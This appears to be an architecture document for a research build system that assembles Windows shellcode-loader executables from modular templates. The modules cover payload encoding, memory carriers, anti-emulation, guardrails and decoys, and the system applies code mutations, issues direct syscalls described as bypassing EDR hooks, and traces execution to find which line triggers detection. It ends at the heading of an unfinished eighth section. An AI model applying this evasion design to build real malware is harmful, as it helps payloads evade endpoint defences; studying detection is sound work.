# Build System Architecture

## 1. Component Hierarchy & Ownership

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                           LIB.RS (Crate Root)                                   │
│  Declares: 6 submodules, re-exports public API, core types                      │
│  Core Types: TraceMode, BuildConfig, Mutation, ArtifactMetadata, ToolchainInfo  │
│  Owns: LowLevelBuilder (LLVM IR pipeline)                                       │
└────────────────────────────────────┬────────────────────────────────────────────┘
                                     │
          ┌──────────┬───────────┬───┴───────┬───────────┬──────────┐
          │          │           │           │           │          │
          ▼          ▼           ▼           ▼           ▼          ▼
┌──────────────┐┌──────────┐┌──────────┐┌──────────┐┌──────────┐┌──────────┐
│   builder    ││ template ││transform ││instrument││  mutator ││ compiler │
│              ││          ││          ││          ││          ││          │
│ ArtifactBldr ││assembler ││ast_mutatr││instrmntr ││ Mutator  ││(placeholder)
│ BuilderConfig││payload   ││ir_mutator││line_trcr ││MutSpec   ││          │
│ BuildInput   ││          ││          ││          ││          ││          │
│ BuiltArtifct ││ModuleSel ││AstMutatr ││Instrmtr  ││          ││          │
│              ││PayloadEnc││IrMutator ││SourceLng ││          ││          │
│              ││EncodType ││          ││TraceFmt  ││          ││          │
│              ││MutatnMrkr││          ││          ││          ││          │
└──────┬───────┘└─────┬────┘└──────────┘└──────┬───┘└──────────┘└──────────┘
       │              │                        │
       │              │                        │
       ▼              ▼                        ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                         RUNTIME (C Libraries)                               │
│                                                                             │
│  ┌─────────────────────────┐   ┌─────────────────────────────────────────┐ │
│  │   minimal_runtime.c     │   │     instrumentation_runtime.c           │ │
│  │   minimal_runtime.h     │   │     instrumentation.h                   │ │
│  │                         │   │                                         │ │
│  │ ALWAYS linked           │   │ Linked when trace_mode != off           │ │
│  │ Provides:               │   │ Provides:                               │ │
│  │ • __runtime_exit()      │   │ • __sanitizer_cov_trace_pc()            │ │
│  │ • Direct syscall exit   │   │ • __sanitizer_cov_trace_pc_guard()      │ │
│  │ • Weak refs to flush    │   │ • __trace_line_binary()                 │ │
│  │   functions             │   │ • __trace_line_b64()                    │ │
│  │                         │   │ • __coverage_bb/init/flush()            │ │
│  │                         │   │ • __checkpoint()                        │ │
│  │                         │   │ • __artifact_checkpoint/success/failure()│ │
│  └─────────────────────────┘   └─────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Build Pipeline Data Flow

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│ PATH A: MODULAR TEMPLATE BUILD (Preferred - BuildInput::ModularTemplate)        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─────────────────────┐                                                        │
│  │  1. PAYLOAD ENCODE  │                                                        │
│  │                     │                                                        │
│  │  Raw bytes ─────────┼──► PayloadEncoder.encode(payload, encoding)            │
│  │                     │         │                                              │
│  │  EncodingType::Xor ─┤    ┌────┴────┐                                        │
│  │  EncodingType::Eng ─┤    │ payload │                                        │
│  │                     │    │ .h code │                                        │
│  └─────────────────────┘    └────┬────┘                                        │
│                                  │                                              │
│  ┌─────────────────────┐         │                                              │
│  │  2. TEMPLATE ASSEM  │         │                                              │
│  │                     │         ▼                                              │
│  │  loader_template.c ─┼──► Assembler.assemble(modules, payload_code)          │
│  │                     │         │                                              │
│  │  @MODULE markers:   │    Replaces:                                           │
│  │  • :payload    ─────┼──── payload.h code                                    │
│  │  • :definitions ────┼──── header/definitions.h                              │
│  │  • :decoder    ─────┼──── decoder/{xor,english}.c                           │
│  │  • :virtualprotect ─┼──── virtualprotect/{standard,undersized}.c            │
│  │  • :antiemulation ──┼──── antiemulation/{none,sirallocalot,timeraw}.c       │
│  │  • :guardrail  ─────┼──── guardrails/{none,env}.c                           │
│  │  • :decoy      ─────┼──── decoy/{none,winexec}.c                            │
│  │  • :carrier    ─────┼──── carrier/{alloc_rw_rx,change_rw_rx,peb_walk}.c     │
│  │                     │         │                                              │
│  └─────────────────────┘         │                                              │
│                                  ▼                                              │
│                          ┌───────────────┐                                      │
│                          │  assembled.c  │ (single merged source)               │
│                          └───────┬───────┘                                      │
│                                  │                                              │
│  ┌─────────────────────┐         │                                              │
│  │  3. AST MUTATIONS   │         │                                              │
│  │                     │         ▼                                              │
│  │  @MUTATE markers:   │   Mutator.apply(source, mutations)                    │
│  │  • timing_jitter    │   strip_mutation_markers() on remaining               │
│  │  • execution_method │         │                                              │
│  │  • api_wrapper      │         │                                              │
│  │  • opaque_predicate │         ▼                                              │
│  │                     │   ┌───────────────┐                                    │
│  └─────────────────────┘   │  final src.c  │ (mutation markers stripped)        │
│                            └───────┬───────┘                                    │
│                                    │                                            │
│  ┌─────────────────────────────────┴──────────────────────────────┐             │
│  │  4. COMPILE (invoke_clang_internal)                            │             │
│  │                                                                │             │
│  │   clang --target=x86_64-pc-windows-msvc                        │             │
│  │         -isystem {xwin}/crt/include                            │             │
│  │         -isystem {xwin}/sdk/include/{ucrt,shared,um,winrt}     │             │
│  │         -L {xwin}/crt/lib/x86_64                               │             │
│  │         -L {xwin}/sdk/lib/{ucrt,um}/x86_64                     │             │
│  │         -fuse-ld=lld                                           │             │
│  │         -O2 -Wl,/Brepro -Wl,/INCREMENTAL:NO                   │             │
│  │         -Wl,-defaultlib:libcmt -Wl,-defaultlib:kernel32        │             │
│  │         [-DENABLE_INSTRUMENTATION]  (if trace != off)          │             │
│  │         source.c minimal_runtime.o [instrumentation_runtime.o] │             │
│  │                                                                │             │
│  └────────────────────────────────┬───────────────────────────────┘             │
│                                   │                                             │
│                                   ▼                                             │
│                          ┌─────────────────┐                                    │
│                          │  {sha256}.exe   │                                    │
│                          │  (Windows PE)    │                                    │
│                          └─────────────────┘                                    │
│                                                                                 │
│  If trace_mode != "off": continues to instrumentation (PATH C below)           │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│ PATH B: LOW-LEVEL LLVM IR BUILD (LowLevelBuilder)                              │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  source.c ──► AST Mutations ──► clang -emit-llvm -S ──► artifact.ll            │
│                                                              │                  │
│                                                              ▼                  │
│                                        IR Mutations ──► mutated.ll              │
│                                                              │                  │
│                                                              ▼                  │
│                                   Instrumenter.instrument() ──► instrumented.ll │
│                                                              │                  │
│                                                              ▼                  │
│                                              llc -filetype=obj ──► artifact.obj │
│                                                              │                  │
│                                                              ▼                  │
│                                   ld.lld -flavor link ──► artifact.exe          │
│                                        + minimal_runtime.obj                    │
│                                        + [instrumentation_runtime.obj]          │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│ PATH C: INSTRUMENTATION (apply_instrumentation)                                │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  Built artifact (BuiltArtifact) with source_path available                     │
│         │                                                                       │
│         ▼                                                                       │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │ Step 1: AST Line Tracing (if trace_mode=Lines|All)                      │   │
│  │                                                                          │   │
│  │   source.c ──► inject_line_traces_with_opts()                            │   │
│  │                   (tree-sitter C++ parser)                               │   │
│  │                   │                                                      │   │
│  │                   ▼                                                      │   │
│  │   Injects __trace_line_binary("file", LINE, __func__) before each stmt  │   │
│  │   Injects volatile delay loops after each trace call                     │   │
│  │                   │                                                      │   │
│  │                   ▼                                                      │   │
│  │   source.line_traced.c  (instrumented source)                            │   │
│  └──────────────────────────────────────────────────────────────────────────┘   │
│         │                                                                       │
│         ▼                                                                       │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │ Step 2: Compile to LLVM IR                                              │   │
│  │                                                                          │   │
│  │   clang -S -emit-llvm -O0 -DENABLE_INSTRUMENTATION ──► source.ll        │   │
│  └──────────────────────────────────────────────────────────────────────────┘   │
│         │                                                                       │
│         ▼                                                                       │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │ Step 3: IR-Level Instrumentation (Instrumenter)                         │   │
│  │                                                                          │   │
│  │   If BB mode: opt -passes=sancov-module ──► BB callbacks injected        │   │
│  │   If API mode: inject_api_tracing() ──► checkpoint calls before APIs     │   │
│  │   add_runtime_declarations() ──► declare external functions              │   │
│  │                                                                          │   │
│  │   ──► source.instrumented_final.ll                                       │   │
│  └──────────────────────────────────────────────────────────────────────────┘   │
│         │                                                                       │
│         ▼                                                                       │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │ Step 4: Compile & Link                                                  │   │
│  │                                                                          │   │
│  │   clang -c ──► source.instrumented.o                                     │   │
│  │   lld-link source.o + instrumentation_runtime.o + minimal_runtime.o      │   │
│  │           + kernel32.lib + user32.lib + advapi32.lib + ws2_32.lib        │   │
│  │           + libcmt.lib + libucrt.lib                                     │   │
│  │                                                                          │   │
│  │   ──► {sha256}.exe  (instrumented final PE)                              │   │
│  └──────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Core Structs & Types

### Crate Root (`lib.rs`)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                              TraceMode (enum)                                   │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Off ─────────── No instrumentation (baseline)                                │
│   Api ─────────── API tracing only (checkpoint calls)                          │
│   BB ──────────── Basic-block coverage (LLVM SanitizerCoverage)                │
│   ApiPlusBB ───── BB + API (DEFAULT for mutation loop)                         │
│   Lines ───────── Line-level tracing (diagnostic, source-level)                │
│   LinesAroundBB ─ Targeted line tracing near specific BB (narrowing)           │
│   All ─────────── Everything (debug mode)                                      │
│                                                                                 │
│   Serde: #[serde(rename_all = "lowercase")]                                    │
│   ApiPlusBB serializes as "api+bb"                                             │
│   LinesAroundBB serializes as "lines-around-bb"                                │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│                           BuildConfig (struct)                                  │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   target: String            "x86_64-pc-windows-msvc"                           │
│   optimization: String      "0" | "1" | "2" | "3" | "s" | "z"                 │
│   trace_mode: TraceMode     Default: Lines                                     │
│   deterministic: bool       Pin timestamps, disable ASLR entropy               │
│   xwin_path: PathBuf        Default: ~/.xwin                                   │
│   llvm_passes: Vec<String>  Custom opt passes                                  │
│   seed: u64                 Mutation seed for reproducibility                  │
│                                                                                 │
│   Used by: LowLevelBuilder (LLVM IR pipeline)                                  │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│                             Mutation (struct)                                   │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   id: String                      "ast.import_reshape", "ir.opaque_predicates" │
│   params: HashMap<String, String>  Key-value mutation parameters               │
│                                                                                 │
│   Used by: LowLevelBuilder                                                     │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│                         ArtifactMetadata (struct)                               │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   artifact_id: String       SHA256 of final PE ("sha256:...")                  │
│   artifact_path: PathBuf    Location of .exe                                   │
│   source_template: String   Original source filename                           │
│   mutations: Vec<Mutation>  Applied mutations                                  │
│   config: BuildConfig       Build settings used                                │
│   build_timestamp: String   RFC3339                                            │
│   toolchain: ToolchainInfo  Compiler versions                                  │
│                                                                                 │
│   Produced by: LowLevelBuilder.generate_metadata()                             │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Builder Module (`builder.rs`)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                          BuilderConfig (struct)                                 │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   templates_dir: PathBuf        "corpus/templates"                             │
│   output_dir: PathBuf           "artifacts"                                    │
│   xwin_dir: PathBuf             "/root/.xwin"                                  │
│   runtime_src: PathBuf          "build/runtime/instrumentation_runtime.c"      │
│   minimal_runtime_src: PathBuf  "build/runtime/minimal_runtime.c"              │
│   modular_template_dir: PathBuf "build/templates"                              │
│                                                                                 │
│   Used by: ArtifactBuilder                                                     │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│                          BuildInput (enum)                                      │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   SourceFile {                  ─── Build from .c file on disk                 │
│     template_name: String           Template directory name                    │
│     source_file: String             Source filename                            │
│     mutations: Vec<MutationSpec>    Mutations to apply                         │
│     trace_mode: String              "off"|"lines"|"api"|"bb"|"api+bb"|"all"   │
│   }                                                                            │
│                                                                                 │
│   LlvmIr {                     ─── Build from pre-compiled LLVM IR            │
│     ir_code: Vec<u8>                Raw IR bytes                               │
│     artifact_name: String           Name for temp files                        │
│     mutations: Vec<MutationSpec>    LLVM IR mutations                          │
│     trace_mode: String                                                         │
│   }                                                                            │
│                                                                                 │
│   SourceCode {                  ─── Build from in-memory C source              │
│     source_code: Vec<u8>            Raw C code bytes                           │
│     artifact_name: String                                                      │
│     mutations: Vec<MutationSpec>                                               │
│     trace_mode: String                                                         │
│   }                                                                            │
│                                                                                 │
│   ModularTemplate {             ─── PREFERRED: @MODULE-based assembly          │
│     modules: ModuleSelection        Carrier, decoder, antiemulation, etc.      │
│     payload: Vec<u8>                Raw payload bytes                          │
│     encoding: EncodingType          XOR or English                             │
│     mutations: Vec<MutationSpec>    AST mutations at @MUTATE markers           │
│     trace_mode: String                                                         │
│   }                                                                            │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│                          BuiltArtifact (struct)                                 │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   artifact_id: String           SHA256 hex digest                              │
│   source_path: PathBuf          Original source location                       │
│   output_path: PathBuf          Final .exe in artifacts/                       │
│   size_bytes: u64               PE file size                                   │
│   sha256: String                Same as artifact_id                            │
│   build_timestamp: DateTime     Build time                                     │
│   compiler_version: String      "clang version X.Y.Z"                          │
│   compiler_flags: Vec<String>   Flags used                                     │
│   mutations_applied: Vec<String> Successfully applied mutation IDs             │
│                                                                                 │
│   Produced by: ArtifactBuilder.build()                                         │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Template Module

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        ModuleSelection (struct)                                │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   carrier: String          "alloc_rw_rx" | "change_rw_rx" | "peb_walk"        │
│   decoder: String          "xor" | "english"                                   │
│   antiemulation: String    "none" | "sirallocalot" | "timeraw"                 │
│   guardrail: String        "none" | "env"                                      │
│   virtualprotect: String   "standard" | "undersized"                           │
│   decoy: String            "none" | "winexec"                                  │
│                                                                                 │
│   Defaults: alloc_rw_rx / xor / none / none / standard / none                 │
│                                                                                 │
│   validate(template_dir) → checks all module .c files exist                   │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│                          EncodingType (enum)                                    │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   Xor ──────── Rolling 2-byte XOR key (default key: [0xAA, 0x55])             │
│   English ──── Dictionary-based word mapping (256-word dictionary)              │
│                                                                                 │
│   decoder_module() → "xor" | "english" (maps to decoder module name)          │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────────┐
│                        MutationMarker (struct)                                 │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   name: String              "timing_jitter", "execution_method", etc.          │
│   params: Vec<String>       ["direct", "callback", "fiber", "threadpool"]      │
│   line: usize               1-indexed source line                              │
│   column: usize             Column position                                    │
│                                                                                 │
│   Parsed from: "// @MUTATE:name(param1|param2|...)" in source                 │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Mutator Module

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                          MutationSpec (struct)                                  │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   id: String                       "llvm.nop_insert" | "ast.string_xor"       │
│   params: HashMap<String, String>   e.g. {"density": "0.3"}                   │
│                                                                                 │
│   parse() → (&category, &name)     Splits on '.'                              │
│                                                                                 │
│   Supported mutations:                                                         │
│   ┌──────────────────┬─────────────────────────────────────────────────────┐   │
│   │ llvm.nop_insert  │ Insert NOP inline asm after BB labels in LLVM IR   │   │
│   │                  │ Params: density (f32, default 0.3)                 │   │
│   │                  │ Uses: deterministic LCG PRNG (seed 1234)           │   │
│   ├──────────────────┼─────────────────────────────────────────────────────┤   │
│   │ ast.string_xor   │ XOR-encode string literals in C source             │   │
│   │                  │ Params: xor_key (u8, default 0xAA)                 │   │
│   │                  │ Uses: GNU C statement expressions ({...})          │   │
│   │                  │ Skips: #pragma, #include, #error contexts          │   │
│   └──────────────────┴─────────────────────────────────────────────────────┘   │
│                                                                                 │
│   Unknown mutations: silently skipped (not an error)                           │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 4. ArtifactBuilder Method Dispatch

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                    ArtifactBuilder.build(input) Dispatch                        │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│   BuildInput                                                                    │
│       │                                                                         │
│       ├── SourceFile ────────────────────────────────────────────┐              │
│       │     │                                                    │              │
│       │     ├── mutations.is_empty()?                            │              │
│       │     │     YES ──► build_template_with_runtime()          │              │
│       │     │     NO ───► build_template_with_mutations_and_runtime()           │
│       │     │                  │                                  │              │
│       │     │                  ├── has_ast_mutations?             │              │
│       │     │                  │     YES ──► Mutator::apply()    │              │
│       │     │                  │                                  │              │
│       │     │                  ├── has_llvm_mutations?            │              │
│       │     │                  │     YES ──► compile_source_to_ir()             │
│       │     │                  │             Mutator::apply(ir)   │              │
│       │     │                  │             compile_ir_to_exe()  │              │
│       │     │                  │     NO ───► invoke_clang_internal()            │
│       │     │                  │                                  │              │
│       │     ├── needs_runtime (trace != "off")?                  │              │
│       │     │     YES ──► apply_instrumentation()                │              │
│       │     │                                                    │              │
│       │     └──► BuiltArtifact                                   │              │
│       │                                                          │              │
│       ├── LlvmIr ──► build_from_llvm_ir_with_mutations()         │              │
│       │                  Mutator::apply(ir, mutations)            │              │
│       │                  invoke_clang_on_ir()                     │              │
│       │                                                          │              │
│       ├── SourceCode ──► build_from_source_code_with_mutations() │              │
│       │                  Mutator::apply(source, mutations)        │              │
│       │                  invoke_clang()                           │              │
│       │                                                          │              │
│       └── ModularTemplate ──► build_modular_template()           │              │
│                  PayloadEncoder.encode()                          │              │
│                  Assembler.assemble()                             │              │
│                  [Mutator::apply()] or strip_mutation_markers()   │              │
│                  invoke_clang_internal()                          │              │
│                  [apply_instrumentation()]                        │              │
│                                                                                 │
│   COMMON FINAL STEPS:                                                          │
│     1. Read artifact bytes                                                     │
│     2. compute_sha256() → artifact_id                                          │
│     3. Rename to artifacts/{sha256}.exe                                        │
│     4. Return BuiltArtifact with metadata                                      │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 5. Instrumentation Modes Matrix

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                          INSTRUMENTATION MODE MATRIX                                    │
├─────────────┬──────────┬──────────┬──────────┬──────────┬──────────┬───────────────────┤
│  TraceMode  │ BB Cover │ API Chk  │ AST Line │ IR Instr │ Runtime  │ Telemetry Output  │
├─────────────┼──────────┼──────────┼──────────┼──────────┼──────────┼───────────────────┤
│ Off         │    ✗     │    ✗     │    ✗     │    ✗     │ minimal  │ (none)            │
│ Api         │    ✗     │    ✓     │    ✗     │    ✓     │ full     │ checkpoints.log   │
│ BB          │    ✓     │    ✗     │    ✗     │    ✓     │ full     │ coverage.bin      │
│             │ (SanCov) │          │          │          │          │ coverage_bbs.txt  │
│ ApiPlusBB   │    ✓     │    ✓     │    ✗     │    ✓     │ full     │ coverage + chkpts │
│ Lines       │    ✗     │    ✗     │    ✓     │    ✗     │ full     │ trace.log (binary)│
│ LinesArndBB │    ✗     │    ✗     │    ✓     │    ✗     │ full     │ trace.log         │
│ All         │    ✓     │    ✓     │    ✓     │    ✓     │ full     │ all of the above  │
├─────────────┴──────────┴──────────┴──────────┴──────────┴──────────┴───────────────────┤
│                                                                                         │
│ minimal = minimal_runtime.o only (provides __runtime_exit)                              │
│ full    = minimal_runtime.o + instrumentation_runtime.o                                 │
│                                                                                         │
│ AST Line tracing uses tree-sitter to inject trace calls into C source before compile   │
│ IR Instrumentation uses LLVM opt with SanitizerCoverage pass or text-based injection   │
│                                                                                         │
└─────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 6. Runtime Library Architecture

### minimal_runtime.c

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        minimal_runtime.c (ALWAYS linked)                       │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  PURPOSE: Clean process exit bypassing all hooks (including EDR)               │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │ __runtime_exit(int exit_code)  [__declspec(noreturn)]                  │   │
│  │                                                                        │   │
│  │   1. Flush telemetry (if weak symbols resolve):                        │   │
│  │      __coverage_flush()   ← NULL if not linked                        │   │
│  │      __trace_flush()      ← NULL if not linked                        │   │
│  │      __checkpoint_flush() ← NULL if not linked                        │   │
│  │                                                                        │   │
│  │   2. Sleep(50ms) to ensure writes complete                             │   │
│  │                                                                        │   │
│  │   3. Initialize syscall numbers (dynamic resolution):                  │   │
│  │      GetSyscallNumber("NtTerminateProcess")                            │   │
│  │        → Parses ntdll.dll stub: 4C 8B D1 B8 XX XX XX XX               │   │
│  │        → Extracts syscall number from bytes [4..7]                     │   │
│  │        → Fallback: 0x2C (Win10/11)                                    │   │
│  │                                                                        │   │
│  │   4. DirectSyscall2() via naked function:                              │   │
│  │      mov r10, rcx   ← Windows syscall convention                      │   │
│  │      mov eax, edx   ← Syscall number                                  │   │
│  │      syscall         ← Direct syscall                                  │   │
│  │      ret                                                               │   │
│  │                                                                        │   │
│  │   5. Fallback: ExitProcess() if syscall fails                          │   │
│  │                                                                        │   │
│  │   Weak symbols:                                                        │   │
│  │   __attribute__((weak)) extern void __coverage_flush(void);            │   │
│  │   __attribute__((weak)) extern void __trace_flush(void);               │   │
│  │   __attribute__((weak)) extern void __checkpoint_flush(void);          │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  LINKING MODEL:                                                                │
│                                                                                 │
│    trace=off:   minimal_runtime.o only                                         │
│                 weak refs → NULL → flush calls skipped                          │
│                                                                                 │
│    trace!=off:  minimal_runtime.o + instrumentation_runtime.o                  │
│                 weak refs → real implementations → flush works                  │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### instrumentation_runtime.c

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                   instrumentation_runtime.c (linked when trace != off)          │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │ BB COVERAGE (AFL-style edge bitmap)                                    │   │
│  │                                                                        │   │
│  │ Storage:                                                               │   │
│  │   __coverage_map[64KB]      AFL edge bitmap                            │   │
│  │   __bb_ids[1024]            Unique BB IDs                              │   │
│  │   __bb_hit_counts[1024]     Per-BB hit counts                          │   │
│  │   __coverage_prev_bb        Previous BB for edge XOR                   │   │
│  │                                                                        │   │
│  │ Edge formula:                                                          │   │
│  │   edge = (prev_bb << 1) XOR curr_bb                                   │   │
│  │   idx  = edge % 65536                                                  │   │
│  │   map[idx] += 1 (saturating at 255)                                    │   │
│  │                                                                        │   │
│  │ SanitizerCoverage callbacks:                                           │   │
│  │   __sanitizer_cov_trace_pc()              ← trace-pc mode             │   │
│  │     Uses __builtin_return_address(0) as BB ID                          │   │
│  │                                                                        │   │
│  │   __sanitizer_cov_trace_pc_guard_init()   ← guard mode                │   │
│  │     Assigns sequential IDs 1..N to guards                              │   │
│  │     Uses MSVC section markers: .SCOV$GA / .SCOV$GZ                    │   │
│  │                                                                        │   │
│  │   __sanitizer_cov_trace_pc_guard(*guard)  ← guard mode                │   │
│  │     Reads BB ID from guard, updates bitmap                             │   │
│  │                                                                        │   │
│  │ Incremental flush: every 50 BBs (BB_FLUSH_INTERVAL)                   │   │
│  │ Output: coverage.bin (bitmap) + coverage_bbs.txt (metadata)           │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │ LINE TRACING (Binary protocol to named pipe / file)                   │   │
│  │                                                                        │   │
│  │ Connection targets (in priority order):                                │   │
│  │   1. \\.\pipe\rededr_trace  (named pipe - preferred)                  │   │
│  │   2. trace.log              (current directory)                        │   │
│  │   3. C:\temp\trace.log      (Windows fallback)                        │   │
│  │   4. /tmp/trace.log         (Unix/WSL fallback)                       │   │
│  │                                                                        │   │
│  │ Binary protocol (InstRecordHeader):                                   │   │
│  │   ┌──────────────────────────────────────────────────────┐            │   │
│  │   │ magic: u32       0x49535452 ('ISTR')                 │            │   │
│  │   │ version: u16     1                                   │            │   │
│  │   │ event_type: u16  1=line, 2=checkpoint, 3=success,    │            │   │
│  │   │                  4=failure                            │            │   │
│  │   │ thread_id: u32   GetCurrentThreadId()                │            │   │
│  │   │ seq_no: u64      Monotonic (InterlockedIncrement64)  │            │   │
│  │   │ ts_us: u64       Microseconds since process start    │            │   │
│  │   │                  (QueryPerformanceCounter)            │            │   │
│  │   │ payload_len: u32 Size of following payload            │            │   │
│  │   ├──────────────────────────────────────────────────────┤            │   │
│  │   │ payload: [u8]    "file:line:func" (UTF-8)            │            │   │
│  │   └──────────────────────────────────────────────────────┘            │   │
│  │                                                                        │   │
│  │ Functions:                                                             │   │
│  │   __trace_line_binary(file, line, func)  ← AST injected (DEFAULT)     │   │
│  │   __trace_line_b64(base64_marker)        ← Lepori thesis format       │   │
│  │   __trace_line(seq, file, line, func)    ← JSON format (legacy)       │   │
│  │                                                                        │   │
│  │ Buffer: 64KB (__trace_buffer)                                         │   │
│  │ Flush: AGGRESSIVE - after every event (EDR early termination safety)  │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │ CHECKPOINT MARKERS (API call tracking)                                 │   │
│  │                                                                        │   │
│  │ Connection: \\.\pipe\rededr_checkpoints or checkpoints.log            │   │
│  │ Format: {"ts_us":N,"checkpoint":"name"}\n                             │   │
│  │ Function: __checkpoint(name)                                           │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────────┐   │
│  │ ARTIFACT STATUS API (user-callable from artifact C code)              │   │
│  │                                                                        │   │
│  │ Uses binary protocol (InstRecordHeader) with event_type:              │   │
│  │                                                                        │   │
│  │   __artifact_checkpoint("name")    event_type=2, payload=name         │   │
│  │   __artifact_success("message")    event_type=3, payload=message      │   │
│  │   __artifact_failure("msg", code)  event_type=4, payload="msg|code"   │   │
│  │                                                                        │   │
│  │ Used via macros from instrumentation.h:                               │   │
│  │   ARTIFACT_CHECKPOINT(name)                                           │   │
│  │   ARTIFACT_SUCCESS(msg)                                               │   │
│  │   ARTIFACT_FAILURE(msg, code)                                         │   │
│  │                                                                        │   │
│  │ When ENABLE_INSTRUMENTATION not defined → macros expand to no-ops     │   │
│  └─────────────────────────────────────────────────────────────────────────┘   │
│                                                                                 │
│  Auto-init: DllMain (DLL_PROCESS_ATTACH/DETACH) + atexit() callbacks          │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 7. AST Line Tracer Detail (`instrument/line_tracer.rs`)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        AST Line Tracer Pipeline                                 │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
│  Input: C/C++ source code + file path + TraceFormat (Binary|Base64)            │
│                                                                                 │
│  Step 1: Parse with tree-sitter (C++ parser for both C and C++)                │
│                                                                                 │
│  Step 2: Walk AST, collect injection points in compound_statement blocks       │
│                                                                                 │
│  Traceable statement kinds:                                                     │
│    expression_statement | declaration | if_statement | while_statement          │
│    | for_statement | for_range_loop | return_statement | break_statement        │
│    | continue_statement | switch_statement | case_statement | labeled_statement │
│    | goto_statement | try_statement | throw_statement                          │
│                                                                                 │
│  Step 3: Generate trace calls (two formats):                                   │
│                                                                                 │
│  Binary (DEFAULT):                                                             │
│    __trace_line_binary("<filepath>", <line>, __func__);                         │
│    volatile long __inst_wait<N> = 1;                                            │
│    for (; __inst_wait<N> < 10000; __inst_wait<N> += 2) {}                       │
│                                                                                 │
│  Base64 (Lepori format):                                                        │
│    __trace_line_b64("YjY0<base64(line:filepath:linenum:)>");                    │
│    volatile long __inst_wait<N> = 1;                                            │
│    for (; __inst_wait<N> < 10000; __inst_wait<N> += 2) {}                       │
│                                                                                 │
│  Step 4: Sort injections by offset (descending), insert into source            │
│                                                                                 │
│  Step 5: Prepend runtime function declaration                                  │
│                                                                                 │
│  Output: Instrumented C/C++ source with trace calls before every statement     │
│                                                                                 │
│  NOTE: Delay loop (volatile counter to 10000) serves as timing jitter          │
│  to help pinpoint exact detection line (Lepori 2023 thesis technique)          │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 8. IR-Level Instrumenter Detail (`instrument/instrumenter.rs`)

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        Instrumenter Pipeline                                    │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                 │
